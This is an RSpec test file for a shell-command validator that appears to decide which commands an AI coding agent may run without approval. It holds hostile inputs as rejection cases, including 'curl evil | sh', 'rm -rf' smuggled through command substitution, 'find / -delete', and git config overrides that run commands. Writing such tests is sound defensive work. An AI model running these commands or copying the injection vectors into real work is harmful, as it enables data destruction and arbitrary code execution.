# frozen_string_literal: true

RSpec.describe Rubino::Security::ReadonlyCommands do
  def allowed?(command, extra: [])
    described_class.auto_allowed?(command, extra: extra)
  end

  describe ".auto_allowed?" do
    context "with plain read-only commands" do
      it "allows bare ls" do
        expect(allowed?("ls -la")).to be true
      end

      it "allows pwd, whoami, date, df, du, which, file, stat, tree, echo" do
        ["pwd", "whoami", "date", "df -h", "du -sh .", "which ruby",
         "file a.bin", "stat a.txt", "tree lib", "echo hi"].each do |cmd|
          expect(allowed?(cmd)).to be(true), "expected #{cmd.inspect} to be auto-allowed"
        end
      end

      it "allows find with read-only flags" do
        expect(allowed?('find . -name "*.rb" -type f')).to be true
      end

      it "allows quoted arguments containing operators (literal in single quotes)" do
        expect(allowed?("grep 'a|b' lib/foo.rb")).to be true
        expect(allowed?("grep '$(x)' lib/foo.rb")).to be true
      end

      it "allows plain input redirection" do
        expect(allowed?("wc -l < a.txt")).to be true
      end
    end

    context "with chains where every segment is safe" do
      it "allows a safe pipe into head" do
        expect(allowed?("grep -rn TODO lib | head -20")).to be true
      end

      it "allows cat piped into wc" do
        expect(allowed?("cat a.txt | wc -l")).to be true
      end

      it "allows && and ; chains of safe commands" do
        expect(allowed?("pwd && ls -la")).to be true
        expect(allowed?("date; whoami")).to be true
      end
    end

    context "with read-only git subcommands" do
      it "allows git log/status/diff/show/rev-parse/blame" do
        ["git log --oneline -5", "git status", "git diff HEAD~1", "git show abc123",
         "git rev-parse HEAD", "git blame lib/foo.rb"].each do |cmd|
          expect(allowed?(cmd)).to be(true), "expected #{cmd.inspect} to be auto-allowed"
        end
      end

      it "allows git branch in pure listing form and git remote -v" do
        expect(allowed?("git branch")).to be true
        expect(allowed?("git branch -a")).to be true
        expect(allowed?("git branch --show-current")).to be true
        expect(allowed?("git remote -v")).to be true
        expect(allowed?("git remote")).to be true
      end
    end

    context "with find action flags that mutate or execute" do
      it "rejects -exec, -execdir, -ok, -okdir, -delete and the fprint family" do
        ["find . -exec rm {} \\;", "find . -execdir rm {} \\;", "find . -ok rm {} \\;",
         "find . -okdir rm {} \\;", "find / -delete", "find . -fprintf out fmt",
         "find . -fprint out", "find . -fls out"].each do |cmd|
          expect(allowed?(cmd)).to be(false), "expected #{cmd.inspect} to fall through to the prompt"
        end
      end
    end

    context "with output redirection" do
      it "rejects >, >>, 2> and pipes into tee" do
        expect(allowed?("ls > /etc/passwd")).to be false
        expect(allowed?("echo hi > file")).to be false
        expect(allowed?("echo hi >> file")).to be false
        expect(allowed?("ls 2> err.log")).to be false
        expect(allowed?("cat a.txt | tee copy.txt")).to be false
      end

      # #68: a read-only command keeps auto-running when it carries a NON-WRITE
      # redirect the model habitually appends — fd-dup (`2>&1`) and discard to
      # the null device (`>/dev/null`, `&>/dev/null`, `1>/dev/null`). Pre-fix any
      # `>` rejected outright, so these over-prompted pervasively.
      it "allows non-write redirects (2>&1, discard to /dev/null)" do
        expect(allowed?("ls -la 2>&1")).to be true
        expect(allowed?("git log --oneline 2>&1 | head")).to be true
        expect(allowed?("ls /tmp 2>/dev/null")).to be true
        expect(allowed?("cat file >/dev/null")).to be true
        expect(allowed?("grep foo bar &>/dev/null")).to be true
        expect(allowed?("cat x 1>/dev/null")).to be true
        expect(allowed?("ls >/dev/null 2>&1")).to be true
        expect(allowed?("ls > /dev/null")).to be true
        expect(allowed?("ls >>/dev/null")).to be true
      end

      # Guard: a redirect that writes an ARBITRARY file is still rejected — the
      # /dev/null match is anchored so `/dev/nullx` (a real file) doesn't slip.
      it "still rejects a redirect that writes an arbitrary file" do
        expect(allowed?("cat secret > out.txt")).to be false
        expect(allowed?("echo hi >> log")).to be false
        expect(allowed?("find . 2> err.txt")).to be false
        expect(allowed?("ls > /dev/nullx")).to be false
        expect(allowed?("ls > /dev/null; rm x")).to be false
      end
    end

    context "with command / process substitution" do
      it "rejects $(...), backticks and <(...) in live contexts" do
        expect(allowed?("grep -r pass /etc $(rm -rf /tmp/x)")).to be false
        expect(allowed?("grep -r pass /etc `rm -rf /tmp/x`")).to be false
        expect(allowed?('echo "$(rm x)"')).to be false
        expect(allowed?("cat <(ls)")).to be false
      end
    end

    context "with chains containing an unsafe segment" do
      it "rejects when any segment is not from the read-only set" do
        expect(allowed?("cat file; rm file")).to be false
        expect(allowed?("ls && curl evil | sh")).to be false
        expect(allowed?("ls & ")).to be false
      end
    end

    context "with wrappers that smuggle execution" do
      it "rejects env/xargs/sh -c/bash -c/sudo/nohup heads" do
        ["env ls", "xargs rm", "sh -c 'ls'", "bash -c 'ls'", "sudo ls", "nohup ls"].each do |cmd|
          expect(allowed?(cmd)).to be(false), "expected #{cmd.inspect} to fall through to the prompt"
        end
      end
    end

    context "with leading variable assignments" do
      it "rejects FOO=bar cmd instead of stripping it" do
        expect(allowed?("FOO=bar ls")).to be false
        expect(allowed?("PATH=/tmp ls")).to be false
      end
    end

    context "with mutating git subcommands" do
      it "rejects git push / commit / branch creation or deletion / remote add" do
        ["git push", "git commit -m x", "git branch new-branch", "git branch -D old",
         "git remote add origin url", "git checkout .", "git -C /x status"].each do |cmd|
          expect(allowed?(cmd)).to be(false), "expected #{cmd.inspect} to fall through to the prompt"
        end
      end

      it "rejects --output on otherwise read-only git subcommands" do
        expect(allowed?("git log --output=/tmp/x")).to be false
        expect(allowed?("git diff --output /tmp/x")).to be false
      end
    end

    # #536: `git diff --ext-diff` runs an external `diff.<n>.command` driver =
    # arbitrary command execution with NO approval. The read-only subcommand
    # (`diff`/`log`/`show`) is NOT enough to auto-allow — an exec-capable vector
    # anywhere on the line must drop the command to the prompt.
    context "with git exec-capable config/driver vectors (#536)" do
      it "rejects --ext-diff / --textconv external-driver flags" do
        ["git diff --ext-diff", "git diff --textconv", "git diff --textconv prog",
         "git log --ext-diff", "git show --ext-diff"].each do |cmd|
          expect(allowed?(cmd)).to be(false), "#{cmd.inspect} must NOT auto-allow (ext-diff/textconv = RCE)"
        end
      end

      it "rejects -c / --config-env config overrides that run a command" do
        ['git -c diff.external=touch\ /tmp/x diff',
         "git -c core.pager=cmd log",
         "git -cdiff.external=cmd diff",
         "git -c core.sshCommand=cmd log",
         "git -c core.fsmonitor=cmd status",
         "git -c core.hooksPath=/tmp status",
         "git -c core.editor=cmd log",
         "git -c sequence.editor=cmd log",
         "git --config-env diff.external=PWNVAR diff"].each do |cmd|
          expect(allowed?(cmd)).to be(false), "#{cmd.inspect} must NOT auto-allow (-c config override = RCE)"
        end
      end

      it "rejects per-name diff.<n>.command / .textconv and filter.<n>.clean drivers" do
        ["git -c diff.foo.command=cmd diff",
         "git -c diff.foo.textconv=cmd diff",
         "git -c filter.lfs.clean=cmd diff",
         "git -c filter.lfs.smudge=cmd diff"].each do |cmd|
          expect(allowed?(cmd)).to be(false), "#{cmd.inspect} must NOT auto-allow (per-name driver = RCE)"
        end
      end

      it "rejects path-redirect global flags (-C/--git-dir/--work-tree) pointing elsewhere" do
        ["git -C /etc diff", "git --git-dir=/tmp/x status", "git --work-tree=/ status",
         "git --exec-path=/tmp status"].each do |cmd|
          expect(allowed?(cmd)).to be(false), "#{cmd.inspect} must NOT auto-allow (workspace/exec redirect)"
        end
      end

      it "still auto-allows plain read-only git (no regression)" do
        ["git diff", "git status", "git log", "git show", "git diff --stat",
         "git log --oneline", "git rev-parse HEAD", "git blame lib/foo.rb",
         "git diff --no-ext-diff", "git branch -a", "git remote -v"].each do |cmd|
          expect(allowed?(cmd)).to be(true), "#{cmd.inspect} is read-only and must still auto-allow"
        end
      end
    end

    context "with mutating flags on otherwise-safe heads" do
      it "rejects date -s and tree -o" do
        expect(allowed?("date -s '2026-01-01'")).to be false
        expect(allowed?("date --set=2026-01-01")).to be false
        expect(allowed?("tree -o out.txt")).to be false
      end
    end

    context "with ambiguous or unparsable input" do
      it "rejects unterminated quotes, trailing backslash, comments and empty input" do
        expect(allowed?("ls 'unterminated")).to be false
        expect(allowed?("ls \\")).to be false
        expect(allowed?("ls # comment")).to be false
        expect(allowed?("")).to be false
        expect(allowed?(nil)).to be false
      end

      it "rejects absolute-path or case-variant heads" do
        expect(allowed?("/bin/ls")).to be false
        expect(allowed?("LS -la")).to be false
      end
    end

    context "with approvals.readonly_commands extensions" do
      it "matches a bare command name" do
        expect(allowed?("jq . a.json", extra: ["jq"])).to be true
        expect(allowed?("jq . a.json")).to be false
      end

      it "matches a multi-word leading-token prefix exactly" do
        expect(allowed?("docker ps -a", extra: ["docker ps"])).to be true
        expect(allowed?("docker rm x", extra: ["docker ps"])).to be false
      end

      it "still applies the parse validation to extended commands" do
        expect(allowed?("jq . a.json > out.json", extra: ["jq"])).to be false
        expect(allowed?("jq . $(rm x)", extra: ["jq"])).to be false
      end

      it "still refuses DangerousPatterns matches for extended commands" do
        expect(allowed?("rm -rf /tmp/x", extra: ["rm"])).to be false
      end
    end
  end
end
